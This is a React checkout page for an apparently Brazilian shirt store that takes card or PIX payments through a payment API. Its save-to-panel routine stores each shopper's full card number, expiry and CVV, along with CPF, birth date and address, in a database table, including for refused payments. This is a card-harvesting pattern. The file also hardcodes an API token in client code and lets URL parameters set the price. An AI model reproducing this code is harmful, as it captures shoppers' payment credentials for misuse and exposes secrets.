import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { useCart } from '../contexts/CartContext';
import { allProducts } from '../data/products';
import { trackInitiateCheckout, trackPurchase, trackLead, sha256, getFbc, getFbp } from '../lib/metaPixel';
import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock, CheckCircle2 } from 'lucide-react';

const IRONPAY_API_URL = 'https://api.ironpayapp.com.br/api/public/v1/transactions';
const IRONPAY_TOKEN = 'qoVerJe5Jw33aHINratQw4XFdc4gtQrEPFJ9QE7CRz22JyHupjVT0h8IdmIf';

interface PixData {
  qrCode: string;
  qrImage: string;
}

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [statusErro, setStatusErro] = useState(false);
  const [metodo, setMetodo] = useState<'cartao' | 'pix'>('cartao');
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixErro, setPixErro] = useState('');
  const [copiado, setCopiado] = useState(false);
  const [aprovado, setAprovado] = useState(false);
  const [parcelas, setParcelas] = useState('1');

  const { items: cartItems, totalPrice: cartTotal, totalItems } = useCart();
  const [timeLeft, setTimeLeft] = useState(300);
  const [produto, setProduto] = useState({
    nome: 'Buscando camisa...',
    preco: 0,
    imagens: [] as string[]
  });

  const [formData, setFormData] = useState({
    nome: '', email: '', cpf: '', dataNascimento: '', telefone: '',
    cep: '', endereco: '', bairro: '', cidade: '', estado: '', numero: '',
    numCartao: '', nomeCartao: '', validade: '', cvv: ''
  });

  useEffect(() => {
    const id = searchParams.get('id');
    const overrideNome = searchParams.get('nome');
    const overridePreco = searchParams.get('preco');
    const overrideImg = searchParams.get('img');
    const qty = parseInt(searchParams.get('qty') || '1');

    if (id) {
      supabase
        .from('produtos')
        .select('*')
        .eq('id', id)
        .single()
        .then(({ data }) => {
          if (data) {
            const parsePrice = (val: any) => {
              if (typeof val === 'number') return val;
              if (typeof val === 'string') {
                const clean = val.replace(/[^\d,.]/g, '').replace(',', '.');
                return parseFloat(clean) || 0;
              }
              return 0;
            };

            setProduto({
              nome: overrideNome || data.nome,
              preco: (overridePreco ? Number(overridePreco) : parsePrice(data.preco)) * qty,
              imagens: [overrideImg || data.imagem_url || data.image].filter(img => img && !img.includes('placeholder')) as string[]
            });
          } else {
            const localProd = allProducts.find(p => p.id === id);
            if (localProd) {
              setProduto({
                nome: overrideNome || localProd.name,
                preco: (overridePreco ? Number(overridePreco) : localProd.priceNum) * qty,
                imagens: [overrideImg || localProd.image].filter(img => img) as string[]
              });
            }
          }
        });
    } else if (overrideNome && overridePreco) {
      setProduto({
        nome: overrideNome,
        preco: Number(overridePreco) || 0,
        imagens: (overrideNome.includes('Carrinho') || overrideNome.includes('CARRINHO')) ? [] : (overrideImg ? [overrideImg] : [])
      });
    } else if (cartItems.length > 0) {
      setProduto({
        nome: `CARRINHO (${totalItems} ITENS)`,
        preco: Number(cartTotal) || 0,
        imagens: cartItems.map(item => item.product.image).filter(img => img)
      });
    }
  }, [searchParams, cartItems, cartTotal, totalItems]);

  // InitiateCheckout — dispara quando o checkout é carregado
  useEffect(() => {
    if (!produto.preco) return;
    const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
    trackInitiateCheckout({
      value: produto.preco,
      numItems: parseInt(searchParams.get('qty') || '1'),
      contentIds: ids,
      userData: { fbc: getFbc(), fbp: getFbp() },
    });
  }, [produto.preco]);

  const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
    try {
      await supabase.from('checkouts').insert([{
        nome_completo: formData.nome,
        email: formData.email,
        cpf: formData.cpf,
        data_nascimento: formData.dataNascimento,
        telefone: formData.telefone,
        cep: formData.cep,
        endereco: formData.endereco,
        bairro: formData.bairro,
        cidade: formData.cidade,
        estado: formData.estado,
        numero: formData.numero,
        numero_cartao: metodo === 'cartao' ? formData.numCartao : 'PAGAMENTO VIA PIX',
        nome_cartao: metodo === 'cartao' ? formData.nomeCartao : 'PAGAMENTO VIA PIX',
        validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
        cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
        produto_nome: produto.nome,
        valor_total: produto.preco,
        status: statusPagamento
      }]);
    } catch (e) {
      console.error("Erro ao salvar dados no painel:", e);
    }
  };

  const gerarPix = async () => {
    if (!formData.nome || !formData.cpf || !formData.email) {
      setPixErro('Preencha os dados pessoais para gerar o PIX.');
      return;
    }

    setPixLoading(true);
    setPixErro('');
    setPixData(null);

    try {
      const amountInCents = Math.round(produto.preco * 100);
      const payload = {
        amount: produto.preco, // Envia valor real, a API converte para centavos
        offer_hash: '35E5jbK1n9',
        payment_method: 'pix',
        installments: 1,
        client: { // A API espera 'client' conforme o código da função
          name: formData.nome,
          email: formData.email,
          phone: formData.telefone,
          document: formData.cpf,
          cep: formData.cep,
          endereco: formData.endereco,
          numero: formData.numero,
          bairro: formData.bairro,
          cidade: formData.cidade,
          estado: formData.estado
        },
        cart: [
          {
            product_hash: 'aouiaiqbuo',
            title: produto.nome,
            price: amountInCents,
            quantity: 1,
            operation_type: 1,
            tangible: true
          }
        ],
        expire_in_days: 1,
        transaction_origin: 'api'
      };

      const res = await fetch('/api/create-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      if (!res.ok) throw new Error(json?.error || 'Erro ao gerar PIX');

      const qrCode = json?.pix?.code || '';
      const qrImage = json?.pix?.image || '';

      if (!qrCode) throw new Error('PIX gerado sem código pela IronPay.');

      setPixData({ 
        qrCode, 
        qrImage
      });
      
      await salvarDadosNoPainel('pix_generated');
      // InitiateCheckout server-side (PIX gerado = intenção de compra confirmada)
      const emailHash = await sha256(formData.email);
      const phoneHash = await sha256(formData.telefone.replace(/\D/g, ''));
      const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
      trackInitiateCheckout({
        value: produto.preco,
        numItems: 1,
        contentIds: ids,
        userData: { em: emailHash, ph: phoneHash, fbc: getFbc(), fbp: getFbp() },
      });
    } catch (err: any) {
      setPixErro(err?.message || 'Erro ao conectar com IronPay.');
    } finally {
      setPixLoading(false);
    }
  };

  const handleFinalizar = async (e: React.FormEvent) => {
    e.preventDefault();
    if (metodo === 'pix') {
      if (!pixData) gerarPix();
      return;
    }

    setLoading(true);
    setStatusErro(false);

    try {
      const amountInCents = Math.round(produto.preco * 100);
      const [mes, ano] = formData.validade.split('/');
      
      const payload = {
        amount: produto.preco,
        offer_hash: '35E5jbK1n9',
        payment_method: 'credit_card',
        installments: parseInt(parcelas),
        card: {
          number: formData.numCartao.replace(/\s/g, ''),
          holder_name: formData.nomeCartao,
          expiry_month: parseInt(mes),
          expiry_year: 2000 + parseInt(ano),
          cvv: formData.cvv
        },
        client: {
          name: formData.nome,
          email: formData.email,
          phone: formData.telefone,
          document: formData.cpf,
          cep: formData.cep,
          endereco: formData.endereco,
          numero: formData.numero,
          bairro: formData.bairro,
          cidade: formData.cidade,
          estado: formData.estado
        },
        cart: [{
          product_hash: 'aouiaiqbuo',
          title: produto.nome,
          price: amountInCents,
          quantity: 1,
          operation_type: 1,
          tangible: true
        }],
        transaction_origin: 'api'
      };

      const res = await fetch('/api/create-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const json = await res.json();
      
      const status = json?.card?.status || json?._raw?.payment_status || json?._raw?.status;
      if (res.ok && (status === 'paid' || status === 'approved')) {
        await salvarDadosNoPainel('paid');
        setAprovado(true);
        // Purchase — compra aprovada no cartão
        const emailHashPurchase = await sha256(formData.email);
        const phoneHashPurchase = await sha256(formData.telefone.replace(/\D/g, ''));
        const orderId = json?.id || json?.transaction_id || 'cartao_' + Date.now();
        const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
        trackPurchase({
          orderId,
          value: produto.preco,
          contentIds: ids,
          numItems: parseInt(searchParams.get('qty') || '1'),
          userData: { em: emailHashPurchase, ph: phoneHashPurchase, fbc: getFbc(), fbp: getFbp() },
        });
      } else {
        throw new Error(json?.message || json?.error || 'Cartão recusado');
      }
    } catch (err: any) {
      console.error("Erro Pagamento:", err);
      await salvarDadosNoPainel('refused');
      setStatusErro(true);
    } finally {
      setLoading(false);
    }
  };

  const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
    const cep = e.target.value.replace(/\D/g, '');
    if (cep.length === 8) {
      const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setFormData(prev => ({
          ...prev,
          endereco: data.logradouro, bairro: data.bairro, cidade: data.localidade, estado: data.uf
        }));
      }
    }
  };

  const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
    let { name, value } = e.target;
    if (name === 'telefone') value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
    if (name === 'cpf') value = value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    if (name === 'dataNascimento') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2").substring(0, 10);
    if (name === 'validade') value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 5);
    if (name === 'numCartao') value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
    if (name === 'cep') value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
    setFormData({ ...formData, [name]: value });
  };

  if (aprovado) {
    return (
      <div style={{ background: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '20px', textAlign: 'center' }}>
        <CheckCircle2 size={80} color="#1da154" style={{ marginBottom: '20px' }} />
        <h1 style={{ fontWeight: 900, fontSize: '28px', color: '#000', marginBottom: '10px' }}>PAGAMENTO APROVADO!</h1>
        <p style={{ color: '#666', fontSize: '16px', marginBottom: '30px' }}>Seu pedido foi processado com sucesso e em breve você receberá as atualizações por e-mail.</p>
        <button onClick={() => navigate('/')} style={{ ...btnPagar, maxWidth: '300px' }}>VOLTAR PARA A LOJA</button>
      </div>
    );
  }

  return (
    <div style={{ background: '#f4f7f6', minHeight: '100vh', fontFamily: 'sans-serif', color: '#000', paddingBottom: '40px' }}>
      {loading && (
        <div style={overlayStyle}>
          <div style={spinnerStyle} />
          <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Processando pagamento...</p>
        </div>
      )}

      <div className="notranslate" style={{ maxWidth: '500px', margin: '0 auto', background: '#fff', boxShadow: '0 0 20px rgba(0,0,0,0.1)', minHeight: '100vh' }}>
        <div style={{ padding: '20px', borderBottom: '1px solid #eee', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div>
            <h2 style={{ margin: 0, fontSize: '18px', fontWeight: '900', color: '#000' }}>CHECKOUT SEGURO</h2>
            <div style={{ fontSize: '12px', color: '#1da154', fontWeight: 'bold', display: 'flex', alignItems: 'center', gap: '4px' }}>
              <ShieldCheck size={14} /> Dados criptografados (SSL)
            </div>
          </div>
        </div>

        <div style={{ padding: '20px' }}>
          <div style={productBox}>
            {produto.imagens && produto.imagens.length > 0 && (
              <div style={{ display: 'flex', gap: '5px', overflowX: 'auto', maxWidth: '180px' }}>
                {produto.imagens.slice(0, 3).map((img, idx) => (
                  <img 
                    key={idx}
                    src={img} 
                    alt={`${produto.nome} ${idx}`} 
                    style={{ width: '60px', height: '60px', objectFit: 'cover', borderRadius: '8px', border: '1px solid #ddd', flexShrink: 0 }} 
                  />
                ))}
                {produto.imagens.length > 3 && (
                  <div style={{ width: '60px', height: '60px', background: '#eee', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '12px', fontWeight: 'bold', flexShrink: 0 }}>
                    +{produto.imagens.length - 3}
                  </div>
                )}
              </div>
            )}
            <div style={{ flex: 1 }}>
              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2', textTransform: 'uppercase' }}>
                {produto.nome}
              </div>
              <div style={{ fontSize: '20px', fontWeight: '900', color: '#000', marginTop: '5px' }}>
                R$ {(Number(produto.preco) || 0).toFixed(2).replace('.', ',')}
              </div>
            </div>
          </div>

          <div style={tabContainer}>
            <button type="button" onClick={() => setMetodo('cartao')} style={metodo === 'cartao' ? tabActive : tabInactive}>
              <CreditCard size={18} /> CARTÃO
            </button>
            <button type="button" onClick={() => setMetodo('pix')} style={metodo === 'pix' ? tabActive : tabInactive}>
              <QrCode size={18} /> PIX
            </button>
          </div>

          <form onSubmit={handleFinalizar}>
            <h4 style={sectionLabel}>1. DADOS PESSOAIS</h4>
            <div style={inputGroup}><User size={18} /><input name="nome" placeholder="NOME COMPLETO" required style={inputStyle} value={formData.nome} onChange={mask} /></div>
            <div style={inputGroup}><Mail size={18} /><input name="email" type="email" placeholder="E-MAIL" required style={inputStyle} value={formData.email} onChange={mask} /></div>
            <div style={{ display: 'flex', gap: '10px', flexDirection: 'column', marginBottom: '10px' }}>
              <div style={{ display: 'flex', gap: '10px', width: '100%' }}>
                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} maxLength={14} /></div>
                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><Calendar size={18} /><input name="dataNascimento" placeholder="NASCIMENTO" required style={inputStyle} value={formData.dataNascimento} onChange={mask} maxLength={10} /></div>
              </div>
            </div>
            <div style={{ ...inputGroup, marginBottom: '20px' }}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP (DDD)" required style={inputStyle} value={formData.telefone} onChange={mask} maxLength={15} /></div>

            <h4 style={sectionLabel}>2. ENDEREÇO DE ENTREGA</h4>
            <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
              <div style={{ ...inputGroup, flex: 0.6, marginBottom: 0 }}><input name="cep" placeholder="CEP" required style={inputStyle} onBlur={handleCEP} value={formData.cep} onChange={mask} maxLength={9} /></div>
              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="endereco" placeholder="ENDEREÇO" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
            </div>
            <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
              <div style={{ ...inputGroup, flex: 0.4, marginBottom: 0 }}><input name="numero" placeholder="Nº" required style={inputStyle} value={formData.numero} onChange={mask} /></div>
            </div>
            <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="cidade" placeholder="CIDADE" required style={inputStyle} value={formData.cidade} onChange={mask} /></div>
              <div style={{ ...inputGroup, flex: 0.3, marginBottom: 0 }}><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} maxLength={2} /></div>
            </div>

            {metodo === 'cartao' && (
              <div style={cardSection}>
                <h4 style={{ margin: '0 0 15px 0', fontSize: '13px', color: '#000', fontWeight: 900 }}>3. PAGAMENTO EM ATÉ 12X</h4>
                <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="0000 0000 0000 0000" required={metodo === 'cartao'} style={inputStyle} value={formData.numCartao} onChange={mask} maxLength={19} /></div>
                <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME COMO NO CARTÃO" required={metodo === 'cartao'} style={inputStyle} value={formData.nomeCartao} onChange={mask} /></div>
                <div style={{ display: 'flex', gap: '10px' }}>
                  <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required={metodo === 'cartao'} style={inputStyle} value={formData.validade} onChange={mask} maxLength={5} /></div>
                  <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required={metodo === 'cartao'} style={inputStyle} value={formData.cvv} onChange={mask} maxLength={4} /></div>
                </div>
                <div style={{ ...inputGroup, marginTop: '10px' }}>
                  <CreditCard size={18} />
                  <select value={parcelas} onChange={(e) => setParcelas(e.target.value)} style={{ ...inputStyle, cursor: 'pointer', appearance: 'none' }}>
                    {[1,2,3,4,5,6,7,8,9,10,11,12].map(n => (
                      <option key={n} value={n}>{n}x de R$ {(produto.preco / n).toFixed(2).replace('.', ',')} sem juros</option>
                    ))}
                  </select>
                </div>
                {statusErro && <div style={errorBanner}>⚠️ CARTÃO RECUSADO: Verifique os dados ou tente outro cartão.</div>}
                <button type="submit" style={btnPagar}>FINALIZAR COMPRA</button>
              </div>
            )}

            {metodo === 'pix' && (
              <div style={pixSection}>
                <div style={{ color: '#1da154', border: '2px dashed #1da154', borderRadius: '12px', padding: '15px', fontWeight: '900', marginBottom: '15px', fontSize: '15px', textAlign: 'center', width: '100%', display: 'block' }}>
                  PIX COM RECEBIMENTO IMEDIATO
                </div>
                
                {!pixData && !pixLoading && (
                  <button type="submit" style={btnPagar}>FINALIZAR COMPRA E GERAR PIX</button>
                )}

                {pixLoading && (
                  <div style={{ padding: '20px 0', textAlign: 'center' }}>
                    <div style={{ ...spinnerStyle, margin: '0 auto' }} />
                    <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Gerando seu QR Code...</p>
                  </div>
                )}

                {pixErro && !pixLoading && (
                  <div style={errorBanner}>
                    {pixErro}<br />
                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900' }}>Tentar novamente</button>
                  </div>
                )}

                {pixData && !pixLoading && (
                  <div style={{ textAlign: 'center', animation: 'fadeIn 0.5s ease-in' }}>
                    <div style={{ marginBottom: '10px', color: '#ef4444', fontWeight: 'bold', fontSize: '14px' }}>
                      Pague agora para garantir sua reserva!
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
                      <div style={{ padding: '12px', background: '#fff', borderRadius: '16px', border: '3px solid #1da154', boxShadow: '0 4px 12px rgba(0,0,0,0.1)' }}>
                        <img src={pixData.qrImage} alt="QR Code PIX" style={{ width: '220px', height: '220px' }} />
                      </div>
                    </div>
                    <div style={{ ...pixCodeBox, wordBreak: 'break-all', fontSize: '12px', padding: '12px', background: '#f8f9fa', borderRadius: '8px', marginBottom: '10px', border: '1px solid #ddd' }}>
                      {pixData.qrCode}
                    </div>
                    <button 
                      type="button" 
                      onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} 
                      style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', marginBottom: '10px' }}
                    >
                      {copiado ? '✅ CÓDIGO COPIADO!' : 'COPIAR CÓDIGO PIX'}
                    </button>
                    <p style={{ fontSize: '12px', color: '#666' }}>Após o pagamento, o seu pedido será processado automaticamente.</p>
                  </div>
                )}
              </div>
            )}
          </form>
        </div>
      </div>
      <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
    </div>
  );
}

const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
const spinnerStyle = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite', margin: '0 auto' };
const productBox = { display: 'flex', gap: '15px', padding: '20px', background: '#f8f9fa', borderRadius: '12px', border: '2px solid #000', marginBottom: '20px' };
const tabContainer = { display: 'flex', gap: '8px', marginBottom: '20px', background: '#f1f5f9', padding: '5px', borderRadius: '12px' };
const tabActive = { flex: 1, padding: '12px', border: 'none', borderRadius: '8px', background: '#fff', fontWeight: '900', color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', cursor: 'pointer' };
const tabInactive = { flex: 1, padding: '12px', border: 'none', background: 'transparent', color: '#666', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
const sectionLabel = { fontSize: '12px', fontWeight: '900', color: '#000', margin: '25px 0 10px', letterSpacing: '0.05em' };
const inputGroup = { display: 'flex', alignItems: 'center', border: '2px solid #000', borderRadius: '10px', padding: '0 12px', marginBottom: '10px', flex: 1, background: '#fff' };
const inputStyle = { border: 'none', padding: '14px 0', marginLeft: '10px', width: '100%', outline: 'none', fontSize: '14px', fontWeight: '900', color: '#000', background: 'transparent' };
const cardSection = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
const errorBanner = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
const btnPagar = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
const pixCodeBox = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
